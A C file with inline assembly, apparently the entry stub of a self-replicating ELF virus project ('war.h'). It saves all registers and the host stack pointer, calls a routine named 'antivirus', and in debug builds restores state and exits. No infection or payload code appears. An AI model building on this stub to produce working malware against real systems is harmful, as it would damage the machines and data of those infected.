#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void __entry(void)
{
	asm volatile
	(
		"push rbp\n"
		"push 0x0\n"
		"push rbx\n"
		"push rax\n"
		"push rdi\n"
		"push rsi\n"
		"push rdx\n"
		"push rcx\n"
		"push r8\n"
		"push r9\n"
		"push r10\n"
		"push r11\n"
		"push r12\n"
		"push r13\n"
		"push r14\n"
		"push r15\n"
	);

	struct s_keychain keychain = {0};
	struct s_host host = {0};

	asm volatile
	(
		"mov %0, rsp\n"
		: "=r"(host.rsp)
		:
	);

	antivirus(&host, &keychain, SUCCESS);
	
#if DEBUG
	asm volatile
	(
	 	"pop r15\n"
		"pop r14\n"
		"pop r13\n"
		"pop r12\n"
		"pop r11\n"
		"pop r10\n"
		"pop r9\n"
		"pop r8\n"
		"pop rcx\n"
		"pop rdx\n"
		"pop rsi\n"
		"pop rdi\n"
		"pop rax\n"
		"pop rbx\n"
		"pop rbp\n"
		"pop rsp\n"
		"add rsp, 0x8\n"
	 	"mov rax, 0x3c\n"
		"syscall\n"
	);
#endif
}
